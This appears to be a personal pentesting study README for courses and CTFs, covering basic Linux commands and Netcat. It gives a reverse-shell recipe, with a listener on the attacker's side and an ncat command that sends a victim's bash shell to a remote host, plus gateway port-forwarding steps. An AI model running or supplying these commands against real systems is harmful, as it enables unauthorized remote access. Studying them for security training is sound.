# Pentest handbook

This repository will contain my personal studying notes and some code I'll write during courses and CTFs (capture the flag) including port-scanners, basic malwares, reverse shells etc

## Basic Linux for pentesting

### uname
```
~$ uname
~$ uname -a
```
Display system information
```
~$ uname -r
```
`4.15.0-99-generic` <br>
Display kernel release. `Useful for searching for potential exploits` 
### env
```
~$ env | grep SHELL
~$ env | grep MAIL
```
Display current enviroment.

## Netcat

### Basic usage
```
~$ ncat -lvp {port}
```
Listen on port 456 (verbose)
```
~$ ncat xxx.xx.xx.x {port}
```
Connect to remote address on specified port

### Reverse Shell
In order to access a reverse shell, you'll need to start listening on your machine, then connect to your own machine through your victim's host <br>
**On your own machine**:
```
~$ ncat -lvp 456
```
This will make your local host listen to any connection on port 456 <br>
**On your victim's machine**:
```
~$ ncat xxx.xx.xx.xx 456 -e /bin/bash/
```
This will connect to the port your machine is listening to and pass the `bash (shell)` as a parameter, making it possible to access your victim's terminal <br><br>
Make sure your gateway is pointing the port to your public IP, e.g: You have 5 machines connected in the same LAN address, each one has their own local address `(e.g. 192.168.0.110)` and all of them can use the port `456` linked tho their local IP. <br><br> However, your gateway has a public IP address `(e.g 201.55.198.2)` which is used to communicate your LAN to the Internet, and its ports are different from the ports your machine may be using, so, in this case, you'll need to access your gateway config and point the public port `456` of your public IP `201.55.198.2` to your local port `456` of your local IP `192.168.0.110`.
